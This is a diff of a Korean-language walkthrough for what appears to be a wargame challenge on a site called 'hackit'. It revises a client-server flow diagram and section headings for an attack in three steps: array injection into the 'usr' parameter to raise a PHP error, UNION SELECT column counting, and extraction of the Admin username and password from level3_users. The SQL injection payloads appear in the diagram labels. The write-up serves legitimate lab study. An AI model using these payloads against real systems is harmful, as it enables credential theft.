@@ -14,49 +14,41 @@
         {
             rank="same";
             "client"[shape="plaintext"];
-            "client" -> step0 -> step2 -> step4;
+            "client" -> step0 -> step2 -> step4 -> step6 -> step8 -> step10 -> step12;
         }
 
         {
             rank="same";
             "server"[shape="plaintext"];
-            "server" -> step1 -> step3 -> step5;
+            "server" -> step1 -> step3 -> step5 -> step7 -> step9 -> step11 -> step13;
         }
-        step0 -> step1[label="?usr[]=",arrowhead="normal"];
-        step3 -> step2[label="@solve",arrowhead="normal"];
+        step0 -> step1[label="post_data: {usr[]=}",arrowhead="normal"];
+        step3 -> step2[label="Error Page",arrowhead="normal"];
+        step4 -> step5[label="post_data: {usr=' union select %s from level3_users-- }",arrowhead="normal"];
+        step7 -> step6[label="Column Length",arrowhead="normal"];
+        step8 -> step9[label="post_data: {usr=' union select 1,2,3,username,password,6,7 from level3_users where username='Admin' -- }",arrowhead="normal"];
+        step11 -> step10[label="Data Extract",arrowhead="normal"];
     }
 
 |
 
-Source Analysis
+server -> DB 예측
 ================================================================================================================
 
-- GET 페이지 취약점
-- GET 파라미터: usr
 - 테이블명: level3_users
+- GET 파라미터: usr
 
+.. code-block:: sql
 
-Show userdetails: 
-TheCow
-Admin
-
-.. code-block:: html
-
-    Show userdetails: 
-    <a href="?usr=MTQ4MTY4MTY1MTMxMTc1MTgz">TheCow</a>
-    <a href="?usr=MTI5MTY0MTczMTY5MTc0">Admin</a>
-
-    <form method="post">
-        Username: <input type="text" name="user">
-        Password: <input type="text" name="password">
-        <input type="submit" name="login" value="Login">
-    </form>
+    SELECT * FROM tb_name where
+    usr=$_POST['usr']
     
-
 |
 
 Array Injection
 ================================================================================================================
+
+- 배열 삽입
 
 .. code-block:: python
 
@@ -79,11 +71,12 @@ Array Injection
     print r.content
 
 
-[error page]
+- 삽입시 에러 페이지
 
 .. code-block:: html
 
-    Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21
+    Warning: preg_match() expects parameter 2 to be string, 
+    array given in /var/www/hackit/urlcrypt.inc on line 21
 
 |
 
@@ -155,8 +148,10 @@ Array Injection
 
 |
 
-Column Length
+union select
 ================================================================================================================
+
+- 컬럼 개수 확인
 
 .. code-block:: python
 
@@ -196,14 +191,12 @@ Column Length
         bef_ret = r.content
 
 
-
-
 |
 
-Data Extract
+union select
 ================================================================================================================
 
-
+- 데이터 추출
 
 .. code-block:: python
 
